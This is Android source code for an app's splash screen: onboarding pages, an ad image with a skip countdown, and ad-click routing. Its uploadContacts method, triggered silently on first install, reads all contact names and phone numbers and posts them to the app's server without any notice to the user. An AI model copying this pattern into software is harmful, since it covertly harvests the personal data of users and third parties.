package com.yunfengsi.Setting;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.v4.view.PagerAdapter;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewStub;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.TextView;

import com.bumptech.glide.Glide;
import com.bumptech.glide.load.engine.DiskCacheStrategy;
import com.bumptech.glide.request.animation.GlideAnimation;
import com.bumptech.glide.request.target.SimpleTarget;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.AbsCallback;
import com.lzy.okgo.callback.StringCallback;
import com.yunfengsi.MainActivity;
import com.yunfengsi.Managers.MessageCenter;
import com.yunfengsi.Models.GongYangDetail;
import com.yunfengsi.Models.Model_activity.ActivityDetail;
import com.yunfengsi.Models.Model_activity.Mine_activity_list;
import com.yunfengsi.Models.Model_zhongchou.FundingDetailActivity;
import com.yunfengsi.Models.NianFo.NianFo;
import com.yunfengsi.Models.ZiXun_Detail;
import com.yunfengsi.ThirdPart.Push.mReceiver;
import com.yunfengsi.R;
import com.yunfengsi.Utils.ACache;
import com.yunfengsi.Utils.AnalyticalJSON;
import com.yunfengsi.Utils.ApisSeUtil;
import com.yunfengsi.Utils.Constants;
import com.yunfengsi.Utils.ImageUtil;
import com.yunfengsi.Utils.LogUtil;
import com.yunfengsi.Utils.LoginUtil;
import com.yunfengsi.Utils.PreferenceUtil;
import com.yunfengsi.Utils.mApplication;
import com.yunfengsi.WebShare.WebInteraction;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URL;
import java.util.HashMap;

import okhttp3.Call;
import okhttp3.Response;

/**
 * Created by Administrator on 2016/10/31.
 */
public class Splash extends AppCompatActivity implements View.OnClickListener {
    private static final String TAG = "Splash";

    /*
       启动页图像控件
     */
    private ImageView      image;
    /*
      跳过
    */
    private TextView       skip;
    /*
     倒数计时器
    */
    private CountDownTimer cdt;

    //获取到的广告页地址
    private String imageUrl;
    private Bitmap mAD;
    private int    screenHeight;

    private TextView type;//类型提示
    private boolean isFirstIn = true;
    /**
     * 轮播引导页
     */
    private ViewPager    pager;
    /**
     * 引导页适配器
     */
    private PagerAdapter pagerAdapter;
    /**
     * 广告页URL
     */
    private URL          y;

    private boolean shouldLoadImage = true;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.splash);
        getWindow().setBackgroundDrawableResource(R.color.transparent);
        initView();
//        MWConfiguration config = new MWConfiguration(this);
//        config.setLogEnable(true);//打开魔窗Log信息
////
//
//        MagicWindowSDK.initSDK(config);
//        MLinkAPIFactory.createAPI(this).registerWithAnnotation(this);
//
//        //跳转router调用
//        LogUtil.e("是否有意图传递：：：" + getIntent().getData());
//        if (getIntent().getData() != null) {
//            MLinkAPIFactory.createAPI(this).router(getIntent().getData());
//            LogUtil.e("微信跳转：：；" + getIntent().getStringExtra("type") + "  " + getIntent().getStringExtra("red"));
//            //跳转后结束当前activity
//            finish();
//        }
    }

    private void gotoHome() {
        startActivity(new Intent(this, MainActivity.class));
        finish();
    }

    /**
     * 获取广告图
     */
    private void getAD() {
        JSONObject js = new JSONObject();
        try {

            js.put("m_id", Constants.M_id);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        ApisSeUtil.M m = ApisSeUtil.i(js);
        LogUtil.e("获取广告：：" + js);
        OkGo.post(Constants.getAD)
                .tag(this)
                .params("key", m.K())
                .params("msg", m.M()).execute(new AbsCallback<Object>() {

            @Override
            public Object convertSuccess(Response response) throws Exception {
                return null;
            }

            @Override
            public void onSuccess(Object o, Call call, Response response) {
                if (shouldLoadImage) {
                    if (response != null) {
                        try {
                            String                  data = response.body().string();
                            HashMap<String, String> map  = AnalyticalJSON.getHashMap(data);
                            Log.w(TAG, "onResponse: 广告页地址" + map + "    是否活动图标：：" + map.get("act_start"));
                            if (map != null) {
                                String url    = map.get("image1");
                                String detail = map.get("url");
                                getBitmapForAD(url, detail);
                                mApplication.changeIcon = "2".equals(map.get("act_start")) ? true : false;
                                mApplication.componentName = getComponentName();
                                LogUtil.e("入口" + mApplication.componentName);
                            }

                        } catch (IOException e) {
                            Log.w(TAG, "onResponse:广告页 错误" + e.toString());
                            e.printStackTrace();
                        }
                    } else {
                        Log.w(TAG, "onResponse:广告页 错误");
                    }
                }
            }


        });
    }

    private void getBitmapForAD(final String url, final String detail) {
        if (shouldLoadImage) {
            Glide.with(this).load(url)
                    .asBitmap().
                    skipMemoryCache(true)
                    .diskCacheStrategy(DiskCacheStrategy.NONE)
//                    .override(getResources().getDisplayMetrics().widthPixels, getResources().getDisplayMetrics().heightPixels)
                    .fitCenter().into(new SimpleTarget<Bitmap>() {
                @Override
                public void onResourceReady(Bitmap resource, GlideAnimation<? super Bitmap> glideAnimation) {
                    if (image != null) {
                        mAD = resource;
                        image.setImageBitmap(resource);
//                        ObjectAnimator oa = ObjectAnimator.ofFloat(image, "alpha", 0f, 1f).setDuration(1000);
//                        oa.start();
                        type.setVisibility(View.VISIBLE);
                        image.setOnClickListener(Splash.this);
                        image.setTag(detail);
                    }
                }
            });

        }


    }


    /**
     * 初始化控件
     */
    private void initView() {
        findViewById(R.id.skip2).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                skip.performClick();
            }
        });
        type = findViewById(R.id.splash_type);
        skip = findViewById(R.id.splash_skip);
        skip.setOnClickListener(this);
        cdt = new CountDownTimer(5200, 1000) {///倒计时
            @Override
            public void onTick(long millisUntilFinished) {
                skip.setText(mApplication.ST("跳过" + (millisUntilFinished / 1000) + "s"));
                Log.w(TAG, "onTick: " + millisUntilFinished);
                skip.setTextColor(Color.parseColor("#ffffff"));
            }

            @Override
            public void onFinish() {
                cdt.cancel();
                cdt = null;
                skip.performClick();
            }
        };
        ACache acache = ACache.get(getApplicationContext());
        if (PreferenceUtil.getUserIncetance(this).getBoolean("isFirstIn", true)) {
            ViewStub viewStubfirst = findViewById(R.id.view_stub_first);
            View     view          = viewStubfirst.inflate();
            pager = view.findViewById(R.id.view_stub_viewpager);
            final int[] images = new int[]{R.drawable.loading1, R.drawable.loading2};
            pagerAdapter = new PagerAdapter() {
                @Override
                public int getCount() {
                    return images.length;
                }

                @Override
                public boolean isViewFromObject(View view, Object object) {
                    return view == object;
                }

                @Override
                public void destroyItem(ViewGroup container, int position, Object object) {
                    container.removeView((View) object);
                }

                @Override
                public Object instantiateItem(ViewGroup container, int position) {
                    ImageView img = new ImageView(Splash.this);
                    img.setScaleType(ImageView.ScaleType.CENTER_CROP);
                    Bitmap bitmap = ImageUtil.readBitMap(Splash.this, images[position]);
                    img.setImageBitmap(bitmap);
                    container.addView(img);
                    return img;
                }

            };
            pager.setOffscreenPageLimit(images.length);
            pager.setAdapter(pagerAdapter);
            pager.addOnPageChangeListener(new ViewPager.OnPageChangeListener() {
                @Override
                public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {

                }

                @Override
                public void onPageSelected(int position) {
                    if (position == images.length - 1) {
                        //最后一页
                        findViewById(R.id.skip2).setVisibility(View.VISIBLE);
                    } else {
                        findViewById(R.id.skip2).setVisibility(View.GONE);

                    }
                }

                @Override
                public void onPageScrollStateChanged(int state) {

                }
            });

        } else {
            ViewStub viewStubstart = findViewById(R.id.view_stub_start);
            View     view          = viewStubstart.inflate();
            image = view.findViewById(R.id.splash_image);
            Bitmap bitmap = ImageUtil.readBitMap(this, R.drawable.start);
            image.setImageBitmap(bitmap);
            //待图片加载好之后 去除activity的背景
            getWindow().setBackgroundDrawable(null);
            image.postDelayed(new Runnable() {
                @Override
                public void run() {
                    getAD();
                    skip.setText(mApplication.ST("跳过5s"));
                    skip.setVisibility(View.VISIBLE);
                    cdt.start();
                }
            }, 1200);


        }

        if (PreferenceUtil.getSettingIncetance(this).getBoolean("isFirstInstall", true)
                && !PreferenceUtil.getUserId(this).equals("")) {
            PreferenceUtil.getSettingIncetance(this).edit().putBoolean("isFirstInstall", false).apply();
            if (Build.VERSION.SDK_INT >= 23) {
                if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                    uploadContacts();
                }
            } else {
                uploadContacts();
            }

        }


    }

    private void uploadContacts() {
        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                cols, null, null, null);
        JSONArray jsonArray = new JSONArray();
        for (int i = 0; i < cursor.getCount(); i++) {
            cursor.moveToPosition(i);
            // 取得联系人名字
            int    nameFieldColumnIndex   = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            int    numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            String name                   = cursor.getString(nameFieldColumnIndex);
            String number                 = cursor.getString(numberFieldColumnIndex);

            HashMap<String, String> map = new HashMap<>();
            map.put("name", name);
            map.put("phone", number);
            JSONObject jsonObject = new JSONObject(map);
            jsonArray.put(jsonObject);
        }
        cursor.close();
        JSONObject js = new JSONObject();
        try {
            js.put("user_id", PreferenceUtil.getUserId(this));
            js.put("contacts", jsonArray.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        ApisSeUtil.M m = ApisSeUtil.i(js);
        OkGo.post(Constants.Contacts)
                .params("key", m.K())
                .params("msg", m.M())
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(String s, Call call, Response response) {

                    }
                });
    }

    /**
     * 手动释放
     */
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (image != null) {
            image.destroyDrawingCache();
            image = null;
        }
        if (mAD != null && !mAD.isRecycled()) {
            mAD.recycle();
            mAD = null;
            System.gc();
        }
        pagerAdapter = null;
        pager = null;
        OkGo.getInstance().cancelTag(this);
        Log.w(TAG, "广告页 :::onDestroy::: " + PreferenceUtil.getUserIncetance(this).getBoolean("isFirstIn", true));
        if (PreferenceUtil.getUserIncetance(this).getBoolean("isFirstIn", true)) {
            SharedPreferences.Editor editor = PreferenceUtil.getUserIncetance(this).edit();
            editor.putBoolean("isFirstIn", false);
            editor.apply();
        }

    }

    /**
     * 点击事件
     *
     * @param v
     */
    @Override
    public void onClick(View v) {
        final Intent intent = new Intent();
        switch (v.getId()) {
            case R.id.splash_skip://跳过
                shouldLoadImage = false;
                v.setEnabled(false);
                if (cdt != null) {
                    cdt.cancel();
                    cdt = null;
                }
                if (image != null) {
                    LogUtil.e("销毁bitmap");
                    image.destroyDrawingCache();
                }
//
                intent.setClass(this, MainActivity.class);
                startActivity(intent);
                finish();
                new LoginUtil().checkLogin(this);


                break;
            case R.id.splash_image:
                if (!v.getTag().toString().equals("")) {
                    if (cdt != null) {
                        cdt.cancel();
                        cdt = null;
                    }
                    if (new LoginUtil().checkLogin(this)) {
                        intent.setClass(this, MainActivity.class);
                        startActivity(intent);
                    }
                    String url = v.getTag().toString();
                    if (url != null) {
                        if (url.contains("yfs.php") && url.contains("red")) {
                            intent.setClass(this, WebInteraction.class);
                            intent.putExtra("type", "5");
                            startActivity(intent);
                            finish();
                            return;
                        }
                        if (url.equals(Constants.Help)) {
                            intent.setClass(Splash.this, AD.class);
                            intent.putExtra("bangzhu", true);
                            startActivity(intent);
                            return;
                        }
                        if (!url.equals("") && url.contains("yfs.php")) {
                            if (url.contains("?")) {
                                int    index = url.lastIndexOf("?");
                                String arg   = url.substring(index + 1, url.length());
                                LogUtil.e("截取后的参数字段：" + arg);
                                if (arg.contains("&")) {
                                    String[]     args = arg.split("&");
                                    final String id   = args[0].substring(args[0].lastIndexOf("=") + 1);
                                    final String type = args[1].substring(args[1].lastIndexOf("=") + 1);
                                    LogUtil.e("字段信息：  id::" + id + "  type::" + type);

                                    Intent intent1 = new Intent();
                                    switch (type) {
                                        case mReceiver.HUODong:
                                            intent1.setClass(Splash.this, ActivityDetail.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.GOngyang:
                                            intent1.setClass(Splash.this, GongYangDetail.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.ZHONGCHou:
                                            intent1.setClass(Splash.this, FundingDetailActivity.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.ZIXUN:
                                            intent1.setClass(Splash.this, ZiXun_Detail.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.BaoMing:
                                            intent1.setClass(Splash.this, Mine_activity_list.class);
                                            break;
                                        case mReceiver.GONGXIU:
                                            intent1.setClass(Splash.this, NianFo.class);
                                            break;
                                        case mReceiver.TongZhi:
                                            intent1.setClass(Splash.this, MessageCenter.class);
                                            break;

                                    }

                                    startActivity(intent1);
                                    finish();
                                    return;
                                }

                            }
                        }
                    }

                    intent.setClass(this, AD.class);
                    intent.putExtra("url", v.getTag().toString());
                    startActivity(intent);
                    finish();
                }

                break;
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }
}
